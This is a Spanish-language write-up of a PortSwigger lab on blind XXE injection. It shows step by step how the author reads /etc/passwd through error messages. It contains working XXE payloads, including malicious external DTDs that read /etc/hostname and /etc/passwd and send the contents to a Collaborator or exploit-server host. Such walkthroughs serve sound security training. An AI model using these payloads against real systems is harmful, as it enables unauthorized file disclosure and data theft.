---
title: XXE Injection Lab 6
date: 2024-11-27 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE Injection
  - Exploiting blind XXE to retrieve data via error messages
image:
  path: /assets/img/XXE-Injection-Lab-6/Portswigger.png
---

## Skills

- Exploiting blind XXE to retrieve data via error messages

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` tiene una `función` de `Check stock` que analiza entradas en `formato XML`, pero `no muestra` el `resultado`. Para resolver el laboratorio, hay que utilizar un `DTD externo` para `provocar` un `mensaje` de `error` que `muestre` el `contenido` del archivo `/etc/passwd`. El laboratorio incluye un enlace a un `servidor` de `exploits` en un dominio diferente donde podemos alojar un `DTD malicioso`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/XXE-Injection-Lab-6/image_1.png)

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![](/assets/img/XXE-Injection-Lab-6/image_2.png)

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![](/assets/img/XXE-Injection-Lab-6/image_3.png)

`Enviamos` una `petición` con un `DTD (Document Type Definition)` y a `comprobar` si es `vulnerable` a `XXE` pero la `web` con `responde` con un `mensaje` de `Entities are not allowed for security reasons`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe "Doe"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y pulsamos en `Copy to clipboard`, este `dominio` obtenido lo vamos a usar para construir este `payload`, el `%` sirve para `llamar` a la `entidad` desde el `DTD` creado

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y observamos que hemos `obtenido respuesta`, lo cual quiere decir que ya tenemos un `XXE out-of-band interaction`

![](/assets/img/XXE-Injection-Lab-6/image_4.png)

Al `enviar` la `petición` obtenemos una `respuesta` que `refleja` un `error`

![](/assets/img/XXE-Injection-Lab-6/image_5.png)

Lo que podemos hacer ahora que hemos confirmado que podemos `cargar` un `recurso` del `servidor externo` es pulsar en `Go to exploit server`, introducir este `payload` en la parte de `Body` y pulsar sobre `Store` para almacenarlo. Esto `&#x25` es `%` pero en `hexadecimal`, se debe poner así y no en el formato normal para que funcione correctamente

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m?content=%file;'>">
%eval;
%exfil;
```

Lo siguiente que debemos hacer es irnos a donde pone `Craft response`, copiar la url `https://exploit-0aa200cb045beea1d8e97fad01f20055.exploit-server.net/exploit` y `enviar` la `petición`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ad700d403aa94da80ea66ed01e5007e.exploit-server.net/exploit"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Ahora nos vamos a `Burpsuite Collaborator`, pulsamos en `Resquest to Collaborator` y vemos el `/etc/hostname`

![](/assets/img/XXE-Injection-Lab-6/image_6.png)

Sin embargo, no nos pide el `/etc/hostname`, lo que nos pide es el `/etc/passwd` y mediante el método anterior no podemos obtenerlo debido a que tiene más de una línea. Podríamos usar este `payload` pero `no funciona` el `wrapper` de `php` que `encodea` en `base64`

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com?content=%file;'>">
%eval;
%exfil;
```

Debido a que cada vez que enviamos una petición `obtenemos` un `mensaje` de `error` podemos `exfiltrar data` mediante este `mensaje` de `error`. Lo primero es `craftearnos` un `entity` que `cargue` el `/etc/passwd` y luego otro `entity` que `cargue` un `archivo inexistente` provocando así un `error`

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///noExiste/%file;'>">
%eval;
%exfil;
```

`Enviamos` nuestra `petición` a nuestro `servidor` donde se encuentra el `exploit`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ad700d403aa94da80ea66ed01e5007e.exploit-server.net/exploit"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

El `servidor` nos `muestra` en el `error` el `/etc/passwd`

![](/assets/img/XXE-Injection-Lab-6/image_7.png)
